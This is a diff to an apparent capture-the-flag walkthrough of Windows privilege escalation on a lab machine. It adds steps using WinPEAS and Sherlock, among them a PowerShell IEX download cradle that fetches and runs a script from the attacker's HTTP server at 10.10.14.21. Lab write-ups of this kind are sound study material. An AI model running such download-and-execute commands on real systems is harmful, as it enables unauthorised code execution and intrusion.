@@ -78,6 +78,7 @@ PS C:\Users\kostas\Desktop>systeminfo
 
 ## Privilege Escalation
 
+### WinPEAS
   - Start SMB server.
 ```CSS
 ▶ sudo impacket-smbserver share . -smb2support
@@ -95,4 +96,18 @@ PS C:\Users\kostas\desktop> ./winPEASx64.exe
 ![image](https://user-images.githubusercontent.com/83878909/236154915-b4378173-3efa-4131-b365-dd54291fe8a2.png)
 No useful information was found.
 
-  - Upload 
+## Sherlock
+  - Python Server
+```CSS
+▶ python -m http.server
+```
+![image](https://user-images.githubusercontent.com/83878909/236175398-fe8dee40-3e4d-492d-938d-9d32b5f117da.png)
+
+  - Edit, Upload and Run: `Sherlock.ps1`.
+  - Add the line `Find-AllVulns` at the end of the script to call this function.
+
+![image](https://user-images.githubusercontent.com/83878909/236176477-6d64ec41-f579-4af4-bdb5-8986fd93981f.png)
+
+```
+IEX(New-Object Net.Webclient).downloadString('http://10.10.14.21:8000/Sherlock.ps1')
+```
